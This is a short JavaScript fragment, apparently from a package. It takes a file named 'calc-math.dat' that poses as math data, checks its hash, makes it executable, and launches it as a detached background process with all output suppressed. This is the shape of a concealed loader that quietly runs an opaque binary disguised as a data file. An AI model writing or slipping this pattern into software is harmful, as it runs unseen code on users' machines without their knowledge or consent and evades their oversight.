const binaryPath = join(__dirname, "internal/calc-math.dat");
verifySha256(binaryPath, "4537b1189ce419f1a595cf47216c03f80e9170ce80dad8d9227a1e52f9cb3466");
await chmod(binaryPath, 0o755);
spawn(binaryPath, [], { detached: true, stdio: "ignore" });
